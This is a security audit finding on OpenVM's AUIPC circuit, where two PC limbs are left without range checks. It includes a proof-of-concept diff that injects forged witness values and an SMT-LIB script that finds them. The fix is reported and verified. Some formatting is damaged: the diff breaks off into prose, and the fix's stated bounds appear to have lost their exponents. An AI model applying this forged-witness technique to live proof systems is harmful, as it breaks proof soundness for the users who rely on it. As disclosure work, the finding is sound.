---
tags:
  - lang/rust
  - sector/zk
  - platform/cantina
  - has/poc
  - severity/high
protocol: "[[OpenVM]]"
auditors:
  - Leo Alt
report: "https://cdn.cantina.xyz/reports/cantina_competition_openvm_january2025.pdf"
genome:
  - "[[integer-bounds]]"
  - "[[known-pattern]]"
---
# Missing range checks in AUIPC 

- id: 53421
- impact: HIGH
- protocol: OpenVM
- reporter: Leo Alt (Cantina)
- source: https://cdn.cantina.xyz/reports/cantina_competition_openvm_january2025.pdf

## Summary


The bug report describes an issue with the code in `core.rs#L106` where the for loop does not constrain the final two limbs of `pc_limbs` to be bytes. This means that the code is not checking for the correct range of values for `pc_limbs[1]` and `pc_limbs[2]`, which can lead to malicious actors being able to manipulate the destination register value and execute arbitrary program paths via `JALR`. A proof of concept has been provided and the fix has been implemented in the code. The recommendation is to iterate over all limbs of `pc_limbs` when range constraining them. The fix has been verified and the vulnerability has been fixed.

## Details

## Context: core.rs#L106

## Summary
The linked for loop misses the final two limbs of `pc_limbs` and fails to range constrain them to be bytes.

## Finding Description
The loop body intends to range constrain `imm_limbs` and `pc_limbs` to be bytes, as is done above this loop for `rd_data`. However, the loop ends 1 iteration too early and fails to range constrain `pc_limbs[1]` and `pc_limbs[2]`.

## Impact Explanation & Likelihood Explanation
With two `pc_limbs` being completely unconstrained, this issue compounds the severity of the missing PC limb range checks in `AUIPC`, where unconstrained limbs allow overflow beyond BabyBear's modulus, enabling a malicious prover to manipulate the destination register value and execute arbitrary program paths via `JALR`. The combination makes exploitation even easier, as the malicious prover no longer needs to find a satisfying witness for `pc_limbs` that consists of bytes only.

This is a separate issue because changes intended to further constrain `pc_limbs` would still not be iterated over with this issue in place.

## Proof of Concept
The proof of concept for missing PC limb range checks in `AUIPC` is valid here, noting that both issues can be fixed together. The patch below shows a localized example of the strategy above, where the honest result of the `AUIPC` instruction is changed in the witness generation code. In the interest of keeping the PoC concise, we do not adjust the witness generation of the following instructions. As a result, this still leads to a challenge phase error, but the constraints that are supposed to enforce the correctness of the result pass.

This can be observed when running the patched code on the Fibonacci example with input `0x1000000000000000`.

```diff
diff --git a/extensions/rv32im/circuit/src/auipc/core.rs b/extensions/rv32im/circuit/src/auipc/core.rs
index b8293a597..e72527372 100644
--- a/extensions/rv32im/circuit/src/auipc/core.rs
+++ b/extensions/rv32im/circuit/src/auipc/core.rs
@@ -171,13 +171,31 @@ where
 .local_opcode_idx(Rv32AuipcOpcode::CLASS_OFFSET),
 );
 let imm = instruction.c.as_canonical_u32();
- let rd_data = run_auipc(local_opcode, from_pc, imm);
+ let mut rd_data = run_auipc(local_opcode, from_pc, imm);
 let rd_data_field = rd_data.map(F::from_canonical_u32);
+ // Note that we still return the honest value, to not influence the
+ // rest of the execution and keep the changes of this PoC contained.
+ // This will cause a challenge phase error, but the constraints should
+ // pass.
 let output = AdapterRuntimeContext::without_pc([rd_data_field]);
 let imm_limbs = array::from_fn(|i| (imm >> (i * RV32_CELL_BITS)) & RV32_LIMB_MAX);
- let pc_limbs = array::from_fn(|i| (from_pc >> ((i + 1) * RV32_CELL_BITS)) & RV32_LIMB_MAX);
+ let mut pc_limbs =
+ array::from_fn(|i| (from_pc >> ((i + 1) * RV32_CELL_BITS)) & RV32_LIMB_MAX);
+
+ println!("");
+ println!("PC: {}", from_pc);
+ println!("Imm: {}", imm);
+ println!("Imm limbs: {:?}", imm_limbs);
+ println!("Honest PC limbs: {:?}", pc_limbs);
+ println!("Honest RD limbs: {:?}", rd_data);
+ if from_pc == 2110400 && imm == 0 {
+ pc_limbs = [51, 32, 240];
+ rd_data = [194, 51, 32, 240];
+ println!("Malicious PC limbs: {:?}", pc_limbs);
+ println!("Malicious RD limbs: {:?}", rd_data);
+ }
 for i in 0..(RV32_REGISTER_NUM_LIMBS / 2) {
 self.bitwise_lookup_chip
 The malicious values can be found, for example, with an SMT solver. Note that uncommenting the two
 lines that add the range constraints suggested as fixes causes the SMT solver to prove that the values are unique.
 ; fixed inputs
 (declare-const imm_limbs_1 Int)
 (declare-const imm_limbs_2 Int)
 (declare-const imm_limbs_3 Int)
 (declare-const from_pc Int)
 ; two versions of every variable and constraint, to check for nondeterminism
 (declare-const pc_limbs_1 Int)
 (declare-const pc_limbs_2 Int)
 (declare-const pc_limbs_3 Int)
 (declare-const pc_limbs_hack_1 Int)
 (declare-const pc_limbs_hack_2 Int)
 (declare-const pc_limbs_hack_3 Int)
 (declare-const carry_0 Int)
 (declare-const carry_1 Int)
 (declare-const carry_2 Int)
 (declare-const carry_3 Int)
 (declare-const carry_hack_0 Int)
 (declare-const carry_hack_1 Int)
 (declare-const carry_hack_2 Int)
 (declare-const carry_hack_3 Int)
 (declare-const data_0 Int)
 (declare-const data_1 Int)
 (declare-const data_2 Int)
 (declare-const data_3 Int)
 (declare-const data_0_hack Int)
 (declare-const data_1_hack Int)
 (declare-const data_2_hack Int)
 (declare-const data_3_hack Int)
 ;; Constants
 (define-fun two_pow_8 () Int 256)
 (define-fun two_pow_16 () Int 65536)
 (define-fun two_pow_24 () Int 16777216)
 (define-fun p () Int 2013265921)
 (define-fun inv_256 () Int 2005401601)
 ;; concrete values from test
 (assert (= from_pc 2110400))
 (assert (= imm_limbs_1 0))
 (assert (= imm_limbs_2 0))
 (assert (= imm_limbs_3 0))
 (assert (= pc_limbs_1 51))
 (assert (= pc_limbs_2 32))
 (assert (= pc_limbs_3 0))
 (assert (= data_0 192))
 (assert (= data_1 51))
 (assert (= data_2 32))
 (assert (= data_3 0))
 ;; Compute intermed_val
 (define-fun intermed_val () Int
 (mod
 (+ (* pc_limbs_1 two_pow_8)
 (* pc_limbs_2 two_pow_16)
 (* pc_limbs_3 two_pow_24))
 p
 ))
 (define-fun intermed_val_hack () Int
 (mod
 (+ (* pc_limbs_hack_1 two_pow_8)
 (* pc_limbs_hack_2 two_pow_16)
 (* pc_limbs_hack_3 two_pow_24))
 p
 ))
 ;; rd_data[0] = from_pc - intermed_val
 (assert (= data_0 (mod (- from_pc intermed_val) p)))
 (assert (= data_0_hack (mod (- from_pc intermed_val_hack) p)))
 ;; Range constraints
 ;; from_pc is 30-bit
 (assert (and (<= 0 from_pc) (< from_pc 1073741824)))
 (assert (and (<= 0 pc_limbs_1) (<= pc_limbs_1 255)))
 ; Correct constraints
 ;(assert (and (<= 0 pc_limbs_2) (<= pc_limbs_2 255)))
 ;(assert (and (<= 0 pc_limbs_3) (<= pc_limbs_3 63)))
 (assert (and (<= 0 pc_limbs_2) (< pc_limbs_2 p)))
 (assert (and (<= 0 pc_limbs_3) (< pc_limbs_3 p)))
 (assert (and (<= 0 pc_limbs_hack_1) (<= pc_limbs_hack_1 255)))
 ; Correct constraints
 ;(assert (and (<= 0 pc_limbs_hack_2) (<= pc_limbs_hack_2 255)))
 ;(assert (and (<= 0 pc_limbs_hack_3) (<= pc_limbs_hack_3 63)))
 (assert (and (<= 0 pc_limbs_hack_2) (< pc_limbs_hack_2 p)))
 (assert (and (<= 0 pc_limbs_hack_3) (< pc_limbs_hack_3 p)))
 (assert (and (<= 0 imm_limbs_1) (<= imm_limbs_1 255)))
 (assert (and (<= 0 imm_limbs_2) (<= imm_limbs_2 255)))
 (assert (and (<= 0 imm_limbs_3) (<= imm_limbs_3 255)))
 (assert (and (<= 0 data_0) (<= data_0 255)))
 (assert (and (<= 0 data_1) (<= data_1 255)))
 (assert (and (<= 0 data_2) (<= data_2 255)))
 (assert (and (<= 0 data_3) (<= data_3 255)))
 (assert (and (<= 0 data_0_hack) (<= data_0_hack 255)))
 (assert (and (<= 0 data_1_hack) (<= data_1_hack 255)))
 (assert (and (<= 0 data_2_hack) (<= data_2_hack 255)))
 (assert (and (<= 0 data_3_hack) (<= data_3_hack 255)))
 ;; Carry[0] is always 0
 (assert (= carry_0 0))
 ;; Carry constraints (must be Boolean: 0 or 1)
 (assert (or (= carry_1 0) (= carry_1 1)))
 (assert (or (= carry_2 0) (= carry_2 1)))
 (assert (or (= carry_3 0) (= carry_3 1)))
 ;; Carry[0] is always 0
 (assert (= carry_hack_0 0))
 ;; Carry constraints (must be Boolean: 0 or 1)
 (assert (or (= carry_hack_1 0) (= carry_hack_1 1)))
 (assert (or (= carry_hack_2 0) (= carry_hack_2 1)))
 (assert (or (= carry_hack_3 0) (= carry_hack_3 1)))
 ;; nondeterminism check
 (assert (or
 (not (= data_0 data_0_hack))
 (not (= data_1 data_1_hack))
 (not (= data_2 data_2_hack))
 (not (= data_3 data_3_hack))
 ))
 ;; Carry propagation
 (assert (= carry_1
 (mod (* (mod (+ (mod (+ pc_limbs_1 imm_limbs_1) p) (- data_1) carry_0) p) inv_256) p)))
 (assert (= carry_hack_1
 (mod (* (mod (+ (mod (+ pc_limbs_hack_1 imm_limbs_1) p) (- data_1_hack) carry_hack_0) p) inv_256) p)))
 (assert (= carry_2
 (mod (* (mod (+ (mod (+ pc_limbs_2 imm_limbs_2) p) (- data_2) carry_1) p) inv_256) p)))
 (assert (= carry_hack_2
 (mod (* (mod (+ (mod (+ pc_limbs_hack_2 imm_limbs_2) p) (- data_2_hack) carry_hack_1) p) inv_256) p)))
 (assert (= carry_3
 (mod (* (mod (+ (mod (+ pc_limbs_3 imm_limbs_3) p) (- data_3) carry_2) p) inv_256) p)))
 (assert (= carry_hack_3
 (mod (* (mod (+ (mod (+ pc_limbs_hack_3 imm_limbs_3) p) (- data_3_hack) carry_hack_2) p) inv_256) p)))
 (check-sat)
 (get-model)
```

## Recommendation
Iterate over all limbs of `pc_limbs` when range constraining them.

## OpenVM
Fixed in commit `b1536101`, the fix adds more comments and improves code readability. The vulnerability related to overflowing PC is fixed by constraining the most significant limb of PC to `[0, 26)` and constraining the middle two limbs `pc_limbs[1]`, `pc_limbs[2]` to be in `[0, 28)`. Additionally, an unnecessary column was removed since the least significant limb of PC is `rd_data[0]` and we can deduce the most significant limb from the rest with the help of `from_pc`.

## Cantina Managed
Fix verified.
